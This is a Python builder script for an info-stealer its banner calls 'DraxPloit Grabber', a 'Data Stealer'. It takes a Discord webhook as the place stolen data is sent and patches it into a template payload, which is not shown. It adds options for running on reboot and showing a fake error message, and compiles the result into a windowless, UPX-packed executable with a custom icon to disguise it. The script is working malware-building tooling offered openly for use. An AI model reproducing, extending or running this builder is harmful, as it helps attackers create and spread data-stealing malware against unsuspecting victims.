import os
import shutil
import subprocess
import sys
import requests

from termcolor import cprint
from pyfiglet import figlet_format
from time import sleep
from colorama import Fore, Style, init

class Builder:
    def __init__(self) -> None:
        
        if not self.check():
            exit()
        self.load()
    
        self.webhook = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Discord Webhook URL: ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.RED}Invalid Webhook!{Fore.RESET}")
            sys.exit()

        self.testwebhook = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Test Discord Webhook? (yes/no): ')
        if self.testwebhook.lower() == 'y' or self.testwebhook.lower() == 'yes':
            testwebhookdata = {"content":"Webhook is working."}
            requests.post(self.webhook, json = testwebhookdata)

        self.filename = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] File Name: ')


        self.startup = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] File executes on reboot? (yes/no): ')
        if self.startup.lower() == 'y' or self.startup.lower() == 'yes':
            self.startup = "yes"
        else:
            self.startup = "no"

        self.fakeerror = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Add fake error? (yes/no): ')
        if self.fakeerror.lower() == 'y' or self.fakeerror.lower() == 'yes':
            self.fakeerror = "yes"
            
            self.fakeerror2 = input(f'  [{Fore.GREEN}FEATURE{Fore.RESET}] Add custom error message? (yes/no): ')
            if self.fakeerror2.lower() == 'y' or self.fakeerror2.lower() == 'yes':
                self.fakeerrorcustom = input(f'    [{Fore.GREEN}FEATURE{Fore.RESET}] Enter custom error message: ')
            else:
                self.fakeerrorcustom = "%fake_error_text%"
        else:
            self.fakeerror = "no"
            self.fakeerrorcustom = "%fake_error_text%"
        

        self.compy = input(f'\n[{Fore.GREEN}FEATURE{Fore.RESET}] Compile file as executable (.exe)? (yes/no): ')

        if self.compy.lower() == 'yes' or self.compy.lower() == 'y':
            self.compy = 'yes'
            self.icon = input(f'  [{Fore.GREEN}FEATURE{Fore.RESET}] Add icon to exe? (yes/no): ')
            if self.icon.lower() == 'yes' or self.icon.lower() == 'y':
                self.icon = 'yes'
                self.icon_exe()
            else:
                pass
        else:
            self.compy = 'no'
            pass

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.GREEN}File created successful!{Fore.RESET}')

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        input(f'[{Fore.GREEN}END{Fore.RESET}] Your setup was finished. Press Enter to exit.')
        sys.exit()

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {'./main.py',
                          './requirements.txt'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'[{Fore.RED}ERROR{Fore.RESET}] {file} not found!')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'[{Force.RED}ERROR{Force.RESET}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')


        return True

    def load(self):
        os.system('mode con:cols=120 lines=45')
        banner = f"""{Fore.GREEN}
                                                                                
                                                                                
                                                                                    
                              .cddddddddddddddddddddc.                              
                            .cdk0OO0OOOOOOOOOOOOOOOOkdc.                            
                          .:dk0O00O0OOOOOOOOOOOOOOOOO0Odc.                          
                        .:dk0O00OO0OOOOOOOOOOOOOOOOOO00OOdc.                     
                      .:dOOOOOOOOOOOOOOO0OO00OOOOOOOO00OO0Odc.          DraxPloit Grabber v1.4         
                    .:dO00OOOOOOOOOOOO0O0OOOOOOOOOOOO00O0O00Odc.        Data Stealer written in Python           
                    ,k0O0OO00OO0OOO000000OOo:;,,,,ck00000OOOO0k,                    
                    ,k0OOOO000000OOOOO00Oo;.       'cx000OOO00k,          
                    ,kOOOOO0xc;;;;:d00Oo;.           'cx0OOO00k,                    
                    ,k0O00xc'      .:dk;              .o00OO00k,          
                    ,k0Oxc'          ck;              .o0OO000k,        https://www.github.com/DraxFM          
                    ,k0Ol.           ck;             ':x0O00O0k,        https://www.github.com/DraxFM/DraxPloit-Grabber 
                    .:oOl.           ck;           .:x00kolxO0k,          
                    .'ckl.         .,oOl,'''''.  .:xOOO0x..lO0k,                    
                  .'ckOOd,''''''''':lxOdllllll:':kOO00O0x. ,lxk,        Discord: Drax#5934          
                  ;kO0OOOOOOOOOOkdc. ckl''''''ckOOOO00O0x. .,ok,        discord.gg/sEXECdC3Et     
                  'lxOOO0OO0O0Odc.   cOOOOOOkOOOOOO0OOkdc. ckdl.                    
                    'oxOO00O00d' ..  cOOO00O0O00OOOOkdl,. .lk,          News:         
                      'oxO0OO0x,'ld;.lO0OO0OOO00O0kxl,,oo..lk,           - this banner was added         
                        ,x0OO0OkkOOkkOOO0OOOOOOO00o..okOd..lk'           - here will be more in the future         
                        .okO000OOOO0OO0OOOO0OO00Oxc..d00d..lk,                      
                         .'okxxxxxxxxxxxxxxxxxxxl,. .dOko..lk,                      
                           .....................;o:..od;. .lx,                      
                          .cddc. :ddl. ,odo,  .lxOo. .,lc..lk' ,odddddddd:.         
              ,ooooooooo; .dOOd..lO0k, :O0O:. 'k0Ol..:dkd'.lx' :kOOOOOOOOkd:.       
            ,oxOOOOOOOOOc. .;dd..lOOx' :kOk:. 'xOOl..dx;'cl,.  ..''.'.':xOOkd:.     
          ;oxOOkl'''''''.    ..  .''.  .'''.   .''. .dd..lx' 'lllllllll:,:xO0kd:.   
        ,okOOkc,;clccccccc, .;;. ,cl:. 'clc'  .:ll,  .,:c,.  .'''',lO00xl:,:x00d.   
       .o00kc,;cdO0Oo;,,,,. .dd..lO0k, :O0O:. 'k0Ol..;:;.        .cdOOOd;;:okO0d.   
       .oO0Oo:;;oO0Odc'      .'  .,,'. .,,,.  .',,;::;'      ':ccdOo;,,;:ok00xc'    
       .oOOO0Oo:;;oO00xc::'  ,:::::::::::::::::::::;'    '::cxO0Oo;;:::ok00xc'      
        ':xO000Oo:;;;;lO00o. ';;;;;;;;;;;;;;;;;;;;'    'cx0000Oo;;:oO000Oxc;:,      
        ';;cdO0O0Oo:;;;:lkxc;;'                   .,;;cx00Ol:::;:oO000Oxc;;;::;,    
      ';::;;;cdO0OO0OOd:;:lk00kc;;,.          .,;;ck0000kl:;;;;dO0Odc:::;cko..od.   
     .od..lkl,;cdO000OOOd:;:lk000Okl,,,.   .',lk0O0000kl:;:dOOOOOdc;,,,lk00o..okc'  
     .dd..lO0kl,;cccdOO00Ox:,:cclxOOO0k;   ,xk0000xlcc:,;dO0O0Odc;,lO0OO0O0o..o00x' 
    .:xd..lO00OOl,'';cdO00OOx:'',:ccclc.   .:ccllc:,'';xOOOdccc;,lOO0OO00ko; .o00x' 
    dO0d..lOOO0OOOOk: ,k000OOOOOd.                .dOOOO00x'   :kOOOOOO0Ol.  .o00x' 
{Fore.RESET}"""
        print(banner)
        sleep(7)
        os.system('cls')
        os.system('mode con:cols=90 lines=30')
        cprint(figlet_format("DraxPloit", font="standard", width = 100),
               "green", attrs=["bold"])

    def icon_exe(self):
        self.icon_name = input(f'    [{Fore.GREEN}FEATURE{Fore.RESET}] Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'[{Fore.RED}ERROR{Fore.RESET}] Icon not found! Notice that it has to be in the current directory!')
            input(f"Press anything to exit...")
            sys.exit()

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'[{Fore.RED}ERROR{Fore.RESET}] Icon must have .ico extension! Please convert it and try again.')
            input(f"Press anything to exit...")

    def renamefile(self, filename):
        try:
            os.rename(f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(f'{Fore.GREEN}File is building...{Fore.RESET}')

        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%WEBHOOK_HERE%', webhook)
                    .replace("%_startup_enabled%", str(self.startup))
                    .replace("%fake_error_enabled%", str(self.fakeerror))
                    .replace("%fake_error_text%", str(self.fakeerrorcustom)))

        sleep(2)
        print(f'{Fore.GREEN}File code is built{Fore.RESET}')

      

        if self.compy == 'yes':
            self.compile(f"{filename}")
        else:
            pass


    def compile(self, filename):
        print(f'[{Fore.GREEN}FEATURE{Fore.RESET}] Compiling code...{Fore.RESET}')
        if self.icon == 'yes':
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
        print(f'{Fore.GREEN}Code compiled!{Fore.RESET}')

    def cleanup(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.py', f'./{filename}.spec', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}

        if self.compy == 'no':
            cleans_file.remove(f'./{filename}.py')
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system("cls")

    Builder()
